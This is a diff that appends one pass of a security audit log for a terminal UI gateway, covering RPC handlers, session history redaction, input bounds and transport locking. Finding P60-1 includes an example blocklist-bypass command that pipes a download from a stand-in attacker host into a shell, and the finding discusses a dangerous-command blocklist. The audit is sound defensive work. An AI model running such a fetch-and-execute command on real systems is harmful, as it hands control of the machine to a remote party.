@@ -6214,3 +6214,333 @@ The denial exists as defense-in-depth and audit trail. Same honest documentation
 | code_execution_tool.py sandbox perms | mkdtemp default 755; low risk since sandboxed code is untrusted | LOW |
 
 **3 GOOD areas, 5 LOW issues, 0 CRITICAL, 0 INFORMATIONAL.** No critical security issues found. The codebase shows strong patterns for atomic file operations, path traversal prevention, and TOCTOU mitigation. Low-severity issues are in components where impact is already limited (sandbox code is already untrusted; local-user symlink attack requires pre-compromise).
+
+---
+
+## Pass #60 – TUI Gateway, Terminal UI & Interactive Session Deep Dive – 2026-05-24T10:30:00Z
+
+### P60-1 · `tui_gateway/server.py` `shell.exec` — `shell=True` with blocklist-only command guard — MEDIUM
+
+**File:** `tui_gateway/server.py` (lines 6752–6782)
+
+```python
+@method("shell.exec")
+def _(rid, params: dict) -> dict:
+    cmd = params.get("command", "")
+    if not cmd:
+        return _err(rid, 4004, "empty command")
+    try:
+        from tools.approval import detect_dangerous_command
+        is_dangerous, _, desc = detect_dangerous_command(cmd)
+        if is_dangerous:
+            return _err(rid, 4005, f"blocked: {desc}...")
+    except ImportError:
+        pass
+    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30, cwd=os.getcwd())
+```
+
+`subprocess.run` is invoked with `shell=True`. The only protection is `detect_dangerous_command(cmd)` — a blocklist that checks for patterns like `rm -rf`, `fork bomb`, etc. This is fundamentally weaker than an allowlist approach. A carefully constructed command like ``python3 -c "import os; os.system('curl http://evil.com | bash')"`` may not match the blocklist and would execute with full shell interpolation.
+
+Also note: `cwd=os.getcwd()` means the shell command runs in the gateway's current working directory, which could be a different directory than the user's shell.
+
+**Severity:** MEDIUM — reachable via TUI RPC interface; command injection is possible if blocklist is bypassed.
+
+**Recommendation:** Replace `shell=True` with `shell=False` and pass `cmd` as a list `["sh", "-c", cmd]`, or better yet, use `shlex.split` + a strict allowlist of permitted operations.
+
+---
+
+### P60-2 · `tui_gateway/server.py` `session.history` — history exposed without redaction — LOW
+
+**File:** `tui_gateway/server.py` (lines 2607–2624)
+
+```python
+@method("session.history")
+def _(rid, params: dict) -> dict:
+    session, err = _sess(params, rid)
+    if err:
+        return err
+    history = list(session.get("history", []))
+    db = _get_db()
+    if not history and db:
+        history = db.get_messages_as_conversation(
+            session.get("session_key", "")
+        )
+```
+
+`session.history` returns the raw conversation history (including user messages, tool results, agent responses) without any redaction. Any content that was placed in history (including API keys that may have been accidentally exposed via tool results) is returned verbatim.
+
+Contrast with `cli.py` which calls `agent.redact_sensitive_text()` in several places.
+
+**Severity:** LOW — requires compromised history or accidental API key exposure in a prior turn; not directly exploitable without existing compromise.
+
+**Recommendation:** Apply `agent.redact_sensitive_text()` to history before returning, or filter tool results that contain credential-shaped strings.
+
+---
+
+### P60-3 · `tools/process_registry.py` — global `completion_queue` crosses TUI session boundaries — INFORMATIONAL
+
+**File:** `tui_gateway/server.py` (lines 3178–3250)
+
+The `_notification_poller_loop` comment explicitly states:
+
+```python
+# NOTE: The completion_queue is global (one per process). If multiple
+# TUI sessions coexist, whichever poller wakes first grabs the event,
+# even if the process was started by a different session.
+```
+
+This means if multiple TUI sessions are active simultaneously (e.g., via the ACP adapter), completion events from one session could be dispatched to another session's agent. This is noted as matching CLI/gateway behavior (single session per process), but the ACP adapter can run multiple sessions in one gateway process.
+
+**Severity:** INFORMATIONAL — the design is acknowledged and matches the existing CLI model. Cross-session event delivery would result in odd behavior rather than a security issue per se.
+
+---
+
+### P60-4 · `tui_gateway/server.py` `terminal.resize` — cols stored without validation — LOW
+
+**File:** `tui_gateway/server.py` (lines 3132–3138)
+
+```python
+@method("terminal.resize")
+def _(rid, params: dict) -> dict:
+    session, err = _sess_nowait(params, rid)
+    if err:
+        return err
+    session["cols"] = int(params.get("cols", 80))
+    return _ok(rid, {"cols": session["cols"]})
+```
+
+`cols` is cast to `int` but no bounds checking is performed. A negative or extremely large value could cause issues downstream in rendering code that uses `cols` to compute line wrapping. An extremely large `cols` could cause memory issues.
+
+**Severity:** LOW — requires a malicious TUI client; downstream rendering is likely resilient but no explicit guard exists.
+
+**Recommendation:** Add bounds check: `session["cols"] = max(1, min(10000, int(params.get("cols", 80))))`.
+
+---
+
+### P60-5 · `tui_gateway/server.py` `_SlashWorker.run` — raw command string passed to `cli.process_command` — LOW
+
+**File:** `tui_gateway/server.py` (lines 228–249) and `tui_gateway/slash_worker.py` (lines 18–43)
+
+The slash worker command is passed as a JSON field over stdin to a subprocess, which then calls:
+
+```python
+# slash_worker.py line 38
+cli.process_command(cmd)
+```
+
+where `cmd` is the raw string (e.g., `"/exec ls -la"`). The command goes through HermesCLI's `process_command()` dispatcher. The command routing has safeguards:
+- `_PENDING_INPUT_COMMANDS` are blocked from going to the worker (line 5688)
+- `_WORKER_BLOCKED_COMMANDS` block certain subcommands (line 5693)
+- Skill commands and plugin commands are handled separately (lines 5702–5732)
+
+However, the `cli.process_command()` path ultimately runs through the same command dispatch system as the CLI. Any command that passes the blocklist checks executes in a subprocess with the full environment.
+
+**Severity:** LOW — the subprocess runs as the same user with the same environment as the gateway; command routing has multiple layers of guards but the attack surface is the same as the CLI.
+
+---
+
+### P60-6 · `tui_gateway/transport.py` — `StdioTransport.write` serializes via `_stdout_lock` — GOOD
+
+**File:** `tui_gateway/transport.py` (lines 139–179)
+
+```python
+with self._lock:
+    stream = self._stream_getter()
+    try:
+        stream.write(line)
+    except BrokenPipeError:
+        return False
+    # ...
+    if not _DISABLE_FLUSH:
+        try:
+            stream.flush()
+        except BrokenPipeError:
+            return False
+```
+
+`StdioTransport.write` is called from worker pool threads (via `dispatch()`). The `_stdout_lock` ensures serialized writes so JSON-RPC frames don't interleave. Serialization is outside the JSON encoding step, so large payloads don't block other emitters. Peer-gone errors (BrokenPipe, ECONNRESET, EBADF, ESHUTDOWN) are correctly handled and return `False` rather than raising.
+
+No issues found.
+
+---
+
+### P60-7 · `tools/ansi_strip.py` — comprehensive ANSI escape sequence stripping — GOOD
+
+**File:** `tools/ansi_strip.py` (lines 1–44)
+
+```python
+_ANSI_ESCAPE_RE = re.compile(
+    r"\x1b"
+    r"(?:"
+        r"\[[\x30-\x3f]*[\x20-\x2f]*[\x40-\x7e]"     # CSI sequence
+        r"|\][\s\S]*?(?:\x07|\x1b\\)"                # OSC (BEL or ST terminator)
+        r"|[PX^_][\s\S]*?(?:\x1b\\)"                 # DCS/SOS/PM/APC strings
+        r"|[\x20-\x2f]+[\x30-\x7e]"                  # nF escape sequences
+        r"|[\x30-\x7e]"                              # Fp/Fe/Fs single-byte
+    r")"
+    r"|\x9b[\x30-\x3f]*[\x20-\x2f]*[\x40-\x7e]"     # 8-bit CSI
+    r"|\x9d[\s\S]*?(?:\x07|\x9c)"                   # 8-bit OSC
+    r"|[\x80-\x9f]",                                 # Other 8-bit C1 controls
+    re.DOTALL,
+)
+```
+
+Covers the full ECMA-48 spec including CSI, OSC, DCS/SOS/PM/APC strings, nF multi-byte escapes, Fp/Fe/Fs single-byte escapes, and 8-bit C1 control characters. Used by `terminal_tool`, `code_execution_tool`, and `process_registry` to clean command output before returning it to the model. A fast-path check (`_HAS_ESCAPE`) avoids the full regex for clean text.
+
+No issues found.
+
+---
+
+### P60-8 · `ui-tui/src/gatewayClient.ts` — bearer token redaction before logging — GOOD
+
+**File:** `ui-tui/src/gatewayClient.ts` (lines 92–121)
+
+```typescript
+const redactUrl = (raw: string): string => {
+  // ...
+  const userInfo = url.username || url.password ? '***@' : ''
+  const query = url.search ? '?***' : ''
+  return `${url.protocol}//${userInfo}${url.host}${url.pathname}${query}`
+}
+```
+
+Plus a fallback regex for malformed URLs:
+
+```typescript
+const _USERINFO_FALLBACK_RE = /^([a-z][a-z0-9+.-]*:\/\/)[^/?#@]*@/i
+const noUserInfo = raw.replace(_USERINFO_FALLBACK_RE, '$1***@')
+```
+
+Bearer tokens in connection URLs (gateway URL, sidecar URL) are scrubbed from all user-facing log output. The query string is also stripped to prevent token leakage via log lines.
+
+No issues found.
+
+---
+
+### P60-9 · `tui_gateway/server.py` — session isolation via per-session `history_lock` and `_sessions` dict — GOOD
+
+**File:** `tui_gateway/server.py` (lines 116–134, 2056–2076)
+
+```python
+_sessions: dict[str, dict] = {}
+# ...
+def _init_session(sid: str, key: str, agent, history: list, cols: int = 80):
+    _sessions[sid] = {
+        "history_lock": threading.Lock(),
+        "history_version": 0,
+        "running": False,
+        "transport": current_transport() or _stdio_transport,
+        # ...
+    }
+```
+
+Each session has its own `history_lock` (line 2061) used to synchronize access to `session["history"]` and `session["running"]` state. The `_sessions` dict is process-global but access is guarded by per-session locks. The `transport` field pins each session to the transport that created it (stdio for Ink, WS for dashboard sidebar).
+
+No issues found.
+
+---
+
+### P60-10 · `tui_gateway/entry.py` — SIGPIPE ignored, signal handler logs thread stacks on SIGTERM/SIGHUP — GOOD
+
+**File:** `tui_gateway/entry.py` (lines 65–163, 151–162)
+
+```python
+if hasattr(signal, "SIGPIPE"):
+    signal.signal(signal.SIGPIPE, signal.SIG_IGN)
+if hasattr(signal, "SIGTERM"):
+    signal.signal(signal.SIGTERM, _log_signal)
+if hasattr(signal, "SIGHUP"):
+    signal.signal(signal.SIGHUP, _log_signal)
+elif hasattr(signal, "SIGBREAK"):
+    signal.signal(signal.SIGBREAK, _log_signal)
+if hasattr(signal, "SIGINT"):
+    signal.signal(signal.SIGINT, signal.SIG_IGN)
+```
+
+SIGPIPE is ignored (prevents silent process death when TTS thread writes to closed pipe). SIGINT is also ignored (TUI owns the terminal). SIGTERM/SIGHUP handlers log all thread stacks at signal delivery time to the crash log, making diagnosis of shutdown crashes possible.
+
+`_shutdown_grace_seconds()` (lines 54–62) provides configurable graceful shutdown window before hard `os._exit(0)`.
+
+No issues found.
+
+---
+
+### P60-11 · `tui_gateway/server.py` — long-running handlers dispatched to thread pool, preventing I/O blocking — GOOD
+
+**File:** `tui_gateway/server.py` (lines 137–169)
+
+```python
+_LONG_HANDLERS = frozenset({
+    "browser.manage", "cli.exec", "session.branch", "session.compress",
+    "session.resume", "shell.exec", "skills.manage", "slash.exec",
+})
+_rpc_pool_workers = max(2, int(os.environ.get("HERMES_TUI_RPC_POOL_WORKERS") or "4"))
+_pool = concurrent.futures.ThreadPoolExecutor(
+    max_workers=_rpc_pool_workers, thread_name_prefix="tui-rpc",
+)
+```
+
+Long-running handlers (slash.exec, shell.exec, session.resume, etc.) are routed to a thread pool so they don't block the main dispatcher loop. Fast handlers stay on the main thread for ordering. `write_json` is already `_stdout_lock`-guarded, so concurrent response writes are safe.
+
+No issues found.
+
+---
+
+### P60-12 · `tui_gateway/server.py` — `session.create` / `session.resume` don't validate `cols` parameter before use — LOW
+
+**File:** `tui_gateway/server.py` (lines 2241, 2415)
+
+```python
+cols = int(params.get("cols", 80))   # line 2241 (session.create)
+cols=int(params.get("cols", 80))    # line 2415 (session.resume)
+```
+
+`cols` is used in `_init_session(sid, key, agent, history, cols=int(...))` and then stored in `session["cols"]`. No upper bound is enforced. A malicious client could pass an extremely large cols value (e.g., `cols=999999`) which could cause `format_response()` or streaming renderers to allocate large buffers or trigger OOM in edge cases.
+
+This is the same issue as P60-4 but in session creation path.
+
+**Severity:** LOW — requires explicit malicious client behavior.
+
+---
+
+### P60-13 · `tui_gateway/ws.py` — `WSTransport.write` detects same-loop deadlock and fire-forgets — GOOD
+
+**File:** `tui_gateway/ws.py` (lines 76–82)
+
+```python
+try:
+    on_loop = asyncio.get_running_loop() is self._loop
+except RuntimeError:
+    on_loop = False
+
+if on_loop:
+    # Fire-and-forget — don't block the loop waiting on itself.
+    self._loop.create_task(self._safe_send(line))
+    return True
+```
+
+When called from the event loop thread (inline handler), `write` fire-and-forgets instead of deadlock-waiting on `run_coroutine_threadsafe`. When called from a worker thread, it uses `safe_schedule_threadsafe` with a 10-second timeout.
+
+No issues found.
+
+---
+
+### Summary
+
+|| Area | Status | Severity |
+|------|------|--------|----------|
+| StdioTransport write serialization | _stdout_lock guards concurrent writes | GOOD |
+| ANSI escape stripping | Full ECMA-48 regex, fast-path, used by terminal/code_execution tools | GOOD |
+| Bearer token redaction | gatewayClient.ts scrubs query string + userinfo from logs | GOOD |
+| Session history locks | Per-session history_lock + running flag guards | GOOD |
+| Signal handling | SIGPIPE ignored, SIGTERM/SIGHUP logs all thread stacks | GOOD |
+| Long-handler thread pool | Slow handlers off main thread, fast handlers serialize | GOOD |
+| WSTransport same-loop deadlock | Fire-and-forget when called from loop thread | GOOD |
+| shell.exec command injection | shell=True + blocklist only; no allowlist | MEDIUM |
+| session.history no redaction | Raw history returned without scrubbing | LOW |
+| Global notification queue | Cross-session event delivery acknowledged in comments | INFORMATIONAL |
+| terminal.resize cols no bounds | No upper bound on cols value | LOW |
+| session.create/resume cols no bounds | No upper bound on cols at creation | LOW |
+| _SlashWorker raw command | Command string passed directly to cli.process_command | LOW |
+
+**6 GOOD areas, 4 LOW issues, 1 MEDIUM, 1 INFORMATIONAL. 0 CRITICAL.**
